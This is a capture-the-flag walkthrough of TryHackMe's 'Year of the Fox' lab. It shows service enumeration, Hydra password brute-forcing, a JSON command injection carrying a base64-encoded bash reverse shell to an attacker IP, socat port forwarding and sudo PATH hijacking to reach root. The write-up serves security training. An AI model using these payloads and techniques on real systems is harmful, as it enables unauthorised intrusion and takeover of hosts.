# Year of the Fox

Don't underestimate the sly old fox... This room includes a competition with over $4,000 worth of prizes to celebrate TryHackMe hitting 100k members!

# Whats the contents of the web flag?

## Services enumeration

Let's start by enumerating the services running on the target with `Nmap`. There is a web service running on standard port 80/tcp and a network share is likely available through Samba.

~~~
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
|_clock-skew: mean: -20m01s, deviation: 34m37s, median: -2s
|_nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2020-08-30T10:59:10+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-08-30T09:59:10
|_  start_date: N/A
~~~

## Network share

Let's start with the network share. Using `smbclient`, we discover a network share named `yotf`, but we can't list its content without a password.

~~~
kali@kali:/data/Year_of_the_Fox$ smbclient -L //10.10.189.152
Enter WORKGROUP\kali's password: 

	Sharename       Type      Comment
	---------       ----      -------
	yotf            Disk      Fox's Stuff -- keep out!
	IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
kali@kali:/data/Year_of_the_Fox$ smbclient //10.10.189.152/yotf
Enter WORKGROUP\kali's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
~~~

Let's use `enum4linux` to list available users. We find 2 valid users: `fox` and `rascal`.

~~~
$ enum4linux -a 10.10.189.152
[REDACTED]
 ======================================================================= 
|    Users on 10.10.189.152 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-978893743-2663913856-222388731
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\fox (Local User)
S-1-22-1-1001 Unix User\rascal (Local User)
[REDACTED]
~~~

If the investigation on the web service doesn't reveal passwords, we will need to brute force the account.

## Web

As far as the web service, we are immediately blocked as the entire path is password protected using a basic authentication.

~~~
kali@kali:/data/Year_of_the_Fox$ curl -I http://10.10.189.152/robots.txt
HTTP/1.1 401 Unauthorized
Date: Sun, 30 Aug 2020 10:01:18 GMT
Server: Apache/2.4.29 (Ubuntu)
WWW-Authenticate: Basic realm="You want in? Gotta guess the password!"
Content-Type: text/html; charset=iso-8859-1
~~~

## Brute forcing the accounts

Let's try to brute force the authentication with hydra using `rascal` as user:

~~~
kali@kali:/data/Year_of_the_Fox$ hydra -l hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.189.152 http-get
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-30 12:13:26
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.189.152:80/
[80][http-get] host: 10.10.189.152   login: rascal   password: pussy1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-30 12:14:17
~~~

Found valid credentials: `rascal:pussy1`.

*Notice: Passwords are randomly generated at boot time. You'll need to brute force the password again if the machine is restarted*

## Rascal's Search System

Now that we are logged in, we can enter the website. It's a search engine that searches text files. Searching for an empty string returns a list of 3 files:

![rascal-search.png](files/rascal-search.png)

Intercepting the request with `BurpSuite` reveals that the request is sent to a `search.php` file, and the user input is passed in a JSON like string.

~~~
POST /assets/php/search.php HTTP/1.1
Host: 10.10.189.152
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.189.152/
Content-Type: text/plain;charset=UTF-8
Content-Length: 13
Authorization: Basic cmFzY2FsOnlvdW5nMQ==
Connection: close

{"target":""}


HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 15:08:48 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 45
Connection: close
Content-Type: text/html; charset=UTF-8

["creds2.txt","fox.txt","important-data.txt"]
~~~

Searching on the Internet for JSON command injections lead me [here](https://riptutorial.com/javascript/example/32217/evaled-json-injection) and using BurpSuite Repeater, I was able to inject a `pwd` command:

~~~
POST /assets/php/search.php HTTP/1.1
Host: 10.10.189.152
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.189.152/
Content-Type: text/plain;charset=UTF-8
Content-Length: 22
Authorization: Basic cmFzY2FsOnlvdW5nMQ==
Connection: close

{"target":"\";pwd \""}


HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 15:11:23 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 33
Connection: close
Content-Type: text/html; charset=UTF-8

["\/var\/www\/html\/assets\/php"]
~~~

## Reverse shell

Trying to inject a bash based reverse shell fails because of a filtering policy ("Invalid characters" returned). Let's base64 encode our payload:

~~~
kali@kali:/data/vpn$ echo -n "bash -i >& /dev/tcp/10.8.50.72/4444 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjUwLjcyLzQ0NDQgMD4mMQ==
~~~

Here is the request with the base64 encoded reverse shell:

~~~
POST /assets/php/search.php HTTP/1.1
Host: 10.10.189.152
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.189.152/
Content-Type: text/plain;charset=UTF-8
Content-Length: 100
Authorization: Basic cmFzY2FsOnlvdW5nMQ==
Connection: close

{"target":"\";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjUwLjcyLzQ0NDQgMD4mMQ== | base64 -d | bash; \""}
~~~

We now have a reverse shell:

~~~
kali@kali:/data/Year_of_the_Fox/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.189.152] 36018
bash: cannot set terminal process group (657): Inappropriate ioctl for device
bash: no job control in this shell
www-data@year-of-the-fox:/var/www/html/assets/php$ pwd
pwd
/var/www/html/assets/php
~~~

## Web flag

From the reverse shell, I was able to find the web flag in `/var/www`:

~~~
www-data@year-of-the-fox:/var/www$ cat web-flag.txt
cat web-flag.txt
THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
~~~

We flag: `THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}`


# What the contents of the user flag?

## Encoded hash in the web directory

Listing the `/home` directory confirms the 2 users found previously: `fox` and `rascal`. We obviously need to move laterally.

Browsing the files in the web directories reveals a base32/base64 encoded file but it doesn't seem to be something we can use. 

~~~
www-data@year-of-the-fox:/var/www/files$ ll
ll
total 12
drwxr-xr-x 2 root root 4096 May 31 21:33 .
drwxr-xr-x 4 root root 4096 May 31 23:37 ..
-rw-r--r-- 1 root root  154 May 31 21:33 creds2.txt
-rw-r--r-- 1 root root    0 May 31 21:33 fox.txt
-rw-r--r-- 1 root root    0 May 31 21:33 important-data.txt
www-data@year-of-the-fox:/var/www/files$ cat creds2.txt
cat creds2.txt
LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAXUTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=
~~~

The decoded content seems to be a hash, but I haven't been able to do anything with it.

~~~
kali@kali:/data/vpn$ echo "LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAXUTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=" | base32 -d | base64 -d
c74341b26d29ad41da6cc68feedebd161103776555c21d77e3c2aa36d8c44730  -
~~~

## Hidden SSH

Running `linpeas.sh` indicates that SSH is only available to localhost:

~~~
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      
~~~

It is confirmed by the `sshd_config` configuration file, which also tells that only the user `fox` can connect:

~~~
www-data@year-of-the-fox:/etc/ssh$ cat sshd_config

[REDACTED]

#Port 22
#AddressFamily any
ListenAddress 127.0.0.1 
#ListenAddress ::

[REDACTED]

AllowUsers fox
~~~

We can use `socat` to open another port (e.g. `2222`) and redirect the traffic to port `22` on localhost. As `socat` is not available on the target, let's download it from our Kali machine:

~~~
www-data@year-of-the-fox:/etc/ssh$ cd /tmp
www-data@year-of-the-fox:/tmp$ wget http://10.8.50.72:8000/socat
www-data@year-of-the-fox:/tmp$ chmod +x socat
www-data@year-of-the-fox:/tmp$ ./socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22
./socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22
~~~

## Brute force SSH

Once this is done, a SSH connection is now available on port `2222`. Time for a new brute force attack (notice that the password is also randomly generated at boot time).

~~~
kali@kali:/data/Year_of_the_Fox/files$ hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.10.189.152:2222
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-30 21:07:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.189.152:2222/
[STATUS] 176.00 tries/min, 176 tries in 00:01h, 14344223 to do in 1358:22h, 16 active
[2222][ssh] host: 10.10.189.152   login: fox   password: raymond
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-30 21:09:53
~~~

## User flag

Now that we have fox's password, let's connect and get the user flag.

~~~
kali@kali:/data/Year_of_the_Fox/files$ ssh fox@10.10.189.152 -p 2222
fox@10.10.189.152's password: 


	__   __                       __   _   _            _____         
	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  ___|____  __
	 \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_ / _ \ \/ /
	  | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  _| (_) >  < 
	  |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|  \___/_/\_\


                                                                  
fox@year-of-the-fox:~$ pwd
/home/fox
fox@year-of-the-fox:~$ ll
total 36
drwxr-x--- 5 fox  fox  4096 Jun 20 02:43 ./
drwxr-xr-x 4 root root 4096 May 28 21:16 ../
lrwxrwxrwx 1 fox  fox     9 May 28 21:16 .bash_history -> /dev/null
-rw-r--r-- 1 fox  fox   220 May 28 21:10 .bash_logout
-rw-r--r-- 1 fox  fox  3771 May 28 21:10 .bashrc
drwx------ 2 fox  fox  4096 May 28 21:16 .cache/
drwx------ 3 fox  fox  4096 May 28 21:16 .gnupg/
-rw-r--r-- 1 fox  fox   807 May 28 21:10 .profile
drwxr-xr-x 2 fox  fox  4096 Jun 20 02:08 samba/
-rw-r--r-- 1 fox  fox     0 May 28 21:16 .sudo_as_admin_successful
-rw-r--r-- 1 root root   38 May 31 23:38 user-flag.txt
fox@year-of-the-fox:~$ cat user-flag.txt 
THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}
~~~

User flag: `THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}`


# Whats the contents of the root flag?

## The shutdown command

Checking fox's privileges with `sudo -l` reveals that we can execute `shutdown` as root without password.

~~~
fox@year-of-the-fox:~$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown
~~~

Checking on [GTFOBins](https://gtfobins.github.io/) if there is anything to exploit against `shutdown` doesn't reveal anything.

Downloading this executable locally, and analyzing it with Hopper reveals that the `shutdown` executable has likely been written by the author of the challenge. It actually relies on the `poweroff` function, which is called without an absolute path, hence creating a vulnerability that we will be able to exploit. Below is the pseudo code of `main` returned by Hopper:

```c
void main() {
    system("poweroff");
    return;
}
```

## Privilege escalation

Let's exploit the vulnerability found and make a copy of `bash` that we will call instead of `poweroff`:

~~~
fox@year-of-the-fox:/usr/sbin$ cd /tmp/
fox@year-of-the-fox:/tmp$ cp /bin/bash /tmp/poweroff
fox@year-of-the-fox:/tmp$ chmod +x /tmp/poweroff 
fox@year-of-the-fox:/tmp$ export PATH=/tmp:$PATH
fox@year-of-the-fox:/tmp$ sudo /usr/sbin/shutdown 
root@year-of-the-fox:/tmp# 
~~~

## Root flag

Now that we are `root`, we can read the `root.txt` file, but this is not our flag:

~~~
root@year-of-the-fox:/tmp# ls -l /root
total 4
-rw-r--r-- 1 root root 21 May 31 23:37 root.txt
root@year-of-the-fox:/tmp# cat /root/root.txt 
Not here -- go find!
~~~

The real root flag is actually hidden in rascal's home:

~~~
root@year-of-the-fox:/home/rascal# cat .did-you-think-I-was-useless.root | tr -d '\n'
THM{ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk}Here's the prize:YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMwMwo=Good luck!
~~~

The "prize" is a base64 encoded string that shows a hash, but not sure what this is?

~~~
root@year-of-the-fox:/home/rascal# echo "YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMwMwo=" | base64 -d
a0274786e2a627078666d6467797046666766683b693232353a6968303
~~~

Root flag: `THM{ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk}`
